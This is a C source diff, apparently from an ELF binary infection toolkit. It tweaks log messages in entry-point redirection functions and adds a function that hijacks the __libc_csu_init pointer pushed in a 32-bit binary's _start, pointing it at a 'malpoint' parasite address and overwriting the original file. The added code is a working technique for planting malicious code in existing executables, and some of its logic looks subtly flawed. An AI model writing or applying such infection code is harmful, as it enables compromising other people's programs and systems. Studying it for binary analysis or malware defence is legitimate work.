@@ -5,7 +5,7 @@ int entry_redirect_32(Elfit_t *host, uint32_t malpoint)
     int ofd, c;
     Elf32_Ehdr *ehdr;
     
-    printf("[+ ENTRY_POINT REDIR] Patching host's entrypoint to 0x%x\n", malpoint);
+    printf("[+ ENTRY_POINT REDIR]\tPatching host's entrypoint to 0x%x\n", malpoint);
 
     ehdr = (Elf32_Ehdr *) host->mem;
 
@@ -33,7 +33,7 @@ int entry_redirect_64(Elfit_t *host, uint64_t malpoint)
     int ofd, c;
     Elf64_Ehdr *ehdr;
     
-    printf("[+ ENTRY_POINT REDIR] Patching host's entrypoint to 0x%x\n", malpoint);
+    printf("[+ ENTRY_POINT REDIR]\tPatching host's entrypoint to 0x%x\n", malpoint);
 
     ehdr = (Elf64_Ehdr *) host->mem;
 
@@ -231,4 +231,78 @@ Elf64_Addr got_redirect_64(Elfit_t *host, char *target, uint64_t malpoint)
     rename(TMP, host->name);
     
     return gotptr;
+}
+
+int libc_start_main_hijack_32(Elfit_t *host, uint32_t malpoint)
+{
+    Elf32_Ehdr *ehdr; 
+    Elf32_Phdr *phdr;
+    Elf32_Addr startaddr; 
+    unsigned char *startoff;
+    uint32_t hltoff;
+    int ofd;
+    int i, pushes, pushfound, c;
+
+    ehdr = (Elf32_Ehdr *) host->mem;
+    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff);
+
+    startaddr = ehdr->e_entry;
+    
+    /* get offset of _start */
+    for(i = 0; i < ehdr->e_phnum; i++, phdr++) 
+    {
+        if (phdr->p_type == PT_LOAD && phdr->p_flags == PF_R | PF_X)
+        {
+            startoff = host->mem + phdr->p_offset + (startaddr - phdr->p_vaddr);
+            break;
+        }
+    }
+
+    
+    /* start for _start and begin looking for pushes to the stack
+     * the 5th push we see (on 32bit) will be pushing a pointer to a to
+     * __libc_csu_init. This is where we'll insert our malpoint */
+    pushes = 0;
+    pushfound = 0;
+    for(i = 0; i < MAX_SEARCH_LEN; i++)
+    {
+        /* pushing a register */
+        if (startoff[i] >= 0x50 && startoff[i] <= 0x59)
+        {
+            pushes++;
+        }
+        /* pushing an address */
+        if (startoff[i] == 0x68)
+        {
+            if (pushes == 4)
+            {
+                *(uint32_t *)&startoff[i+1] = malpoint;
+                printf("[+ LIBC ARG HIJACK]\tHijacking init pointer to 0x%x\n",
+                    malpoint);
+                pushfound = 1;
+            }
+            pushes++;
+        }
+    }
+    if (!pushfound)
+    {
+        printf("[-] correct push instruction could not be located\n");
+    }
+
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
+        < 0)
+    {
+        perror("tmp binary: open");
+        return -1; 
+    }
+
+    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
+    {
+        perror("tmp binary: write");
+        return -1;
+    }
+
+    rename(TMP, host->name);
+    
+       return -1; 
 }
